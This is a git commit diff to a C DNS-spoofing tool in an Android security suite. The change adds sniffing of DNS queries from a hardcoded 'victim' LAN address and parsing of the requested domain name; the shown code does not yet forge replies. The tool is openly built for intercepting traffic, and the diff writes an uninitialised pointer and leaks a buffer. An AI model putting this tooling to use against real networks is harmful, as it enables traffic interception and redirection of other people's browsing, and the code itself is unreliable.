8669923be0071654a6945f282848245e06f810aa
jotsb <ekomkar@hotmail.com>
2016-04-17 13:38:44 -0700

    DNS Spoofing, able to extract the URL from the Query

--- Android-Security-Suite/jni/dns-spoofing/dns-spoof.c
+++ Android-Security-Suite/jni/dns-spoofing/dns-spoof.c
@@ -77,11 +77,13 @@ void* pcap_setup(char *filter) {
 void pkt_callback(u_char *args, const struct pcap_pkthdr *pkt_hdr, const u_char* packet) {
     static int count = 1;
 
+    //fprintf(stderr, "%s", "pkt_callback()");
+
     u_int16_t type = handle_ethernet(args, pkt_hdr, packet);
 
     if (type == ETHERTYPE_IP) {
-        fprintf(stderr, "Packet type = [%s]\n", "IP");
-        //handle_IP(args, pkt_hdr, packet);
+//        fprintf(stderr, "Packet type = [%s]\n", "IP");
+        handle_IP(args, pkt_hdr, packet);
     } else if (type == ETHERTYPE_ARP) {
         fprintf(stderr, "Packet type = [%s]\n", "ARP");
         //handle_arp(args, pkt_hdr, packet);
@@ -115,6 +117,8 @@ u_char* handle_IP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* 
     u_int length = pkthdr->len;
     u_int hlen, off, version;
     int len;
+
+    fprintf(stderr, "%s", "    |> handle_ip()\n");
 
     // Jump to IP packet packet + ETHER_HDRLEN
     ip = (struct my_ip *) (packet + ETHER_HDRLEN);
@@ -170,6 +174,8 @@ u_char* handle_UDP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
     char *dns_pkt;
     u_int caplen = pkthdr->caplen;
 
+    fprintf(stderr, "%s", "        |> handle_udp()\n");
+
     ethernet = (struct sniff_ethernet *) packet;
 
     ip = (struct my_ip *) (packet + ETHER_HDRLEN);
@@ -187,11 +193,41 @@ u_char* handle_UDP(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char*
 
     dns_pkt = (char *) (packet + ETHER_HDRLEN + ip_len + udp_len);
 
-    handle_DNS(args, pkthdr, dns_pkt);
+    handle_DNS(args, pkthdr, packet);
 }
 
 void handle_DNS(u_char *args, const struct pcap_pkthdr* pkthdr, const char* packet) {
+    struct dns_query *dnsquery;
+    struct udp_hdr *udp;
+    struct my_ip *ip;
+    struct sniff_ethernet *ethernet;
+    int udp_len, ip_len;
+    char *dns_pkt;
+    u_int caplen = pkthdr->caplen;
+    char *pkt;
+    char *url;
 
+    url = allocate_strmem(REQUEST_SIZE);
+
+    fprintf(stderr, "%s", "            |> handle_dns()\n");
+
+    ethernet = (struct sniff_ethernet *) packet;
+
+    ip = (struct my_ip *) (packet + ETHER_HDRLEN);
+    ip_len = IP_HL(ip) * 4;
+
+    udp = (struct udp_hdr *) (packet + ETHER_HDRLEN + ip_len);
+
+    dnsquery->qname = (char*) (packet + ETHER_HDRLEN + ip_len + sizeof(struct udp_hdr) + sizeof (struct DNS_HEADER));
+
+    //    pkt = packet;
+    //    dnsquery = (struct dns_query *) (pkt + sizeof (struct DNS_HEADER));
+
+    //fprintf(stderr, "Original: %s\n", dnsquery->qname);
+
+    url = extract_dns_request(dnsquery);
+
+    fprintf(stdout, "Extracted: %s\n", url);
 }
 
 /**
@@ -199,12 +235,19 @@ void handle_DNS(u_char *args, const struct pcap_pkthdr* pkthdr, const char* pack
  * It comes in this format: [3]www[7]example[3]com[0]
  * And it is returned in this: www.example.com
  */
-void extract_dns_request(struct dnsquery *dns_query, char *request) {
+char* extract_dns_request(struct dns_query *dnsquery) {
     unsigned int i, j, k;
-    char *curr = dns_query->qname;
+    char *curr = dnsquery->qname;
     unsigned int size;
+    char *request;
+
+    fprintf(stderr, "%s", "                |> extract_dns_request()\n");
+    request = allocate_strmem(REQUEST_SIZE);
+    fprintf(stderr, "%s URL: %s\n", "                    |> ", curr);
 
     size = curr[0];
+
+    submit_log_i("%d", size);
 
     j = 0;
     i = 1;
@@ -217,20 +260,22 @@ void extract_dns_request(struct dnsquery *dns_query, char *request) {
         size = curr[i++];
     }
     request[--j] = '\0';
+
+    return request;
 }
 
 /*
  * Main Function
  */
 int main(int argc, char** argv) {
-    char *filter = NULL;        // PCAP Filter
-    char *victim_ip = NULL;     // Victim Machine
-    char *interface_name = NULL;// Network interface
-    char *request = NULL;       // Domain in the Query
+    char *filter = NULL; // PCAP Filter
+    char *victim_ip = NULL; // Victim Machine
+    char *interface_name = NULL; // Network interface
+    char *request = NULL; // Domain in the Query
     char *spoof_address = NULL; // Spoofed Address in the Answer
     int c, status;
 
-    if (argc < 9) {
+    /*if (argc < 9) {
         fprintf(stderr, "\nPlease use -i for Network Interface \nAND -v for Victim IP Address \nAND -r for the domain \n AND -a for the spoofed address \nOR -h for help");
     } else {
         while ((c = getopt(argc, argv, "i:v:r:a:h")) != 1) {
@@ -256,11 +301,34 @@ int main(int argc, char** argv) {
 
     if ((status = asprintf(&filter, "%s %s", "udp and port 53 and src", victim_ip)) < 0) {
         fprintf(stderr, "Unable to get the Victim IP Address");
-    }
+    }*/
+
+    filter = "udp and port 53 and src 192.168.0.19";
 
     pcap_setup(filter);
 
     return (EXIT_SUCCESS);
+}
+
+
+// Allocate memory for an array of chars.
+
+char * allocate_strmem(int len) {
+    void *tmp;
+
+    if (len <= 0) {
+        fprintf(stderr, "15. ERROR: Cannot allocate memory because len = %i in allocate_strmem().\n", len);
+        exit(EXIT_FAILURE);
+    }
+
+    tmp = (char *) malloc(len * sizeof (char));
+    if (tmp != NULL) {
+        memset(tmp, 0, len * sizeof (char));
+        return (tmp);
+    } else {
+        fprintf(stderr, "16. ERROR: Cannot allocate memory for array allocate_strmem().\n");
+        exit(EXIT_FAILURE);
+    }
 }
 
 int submit_log(char *msgType, char *string) {
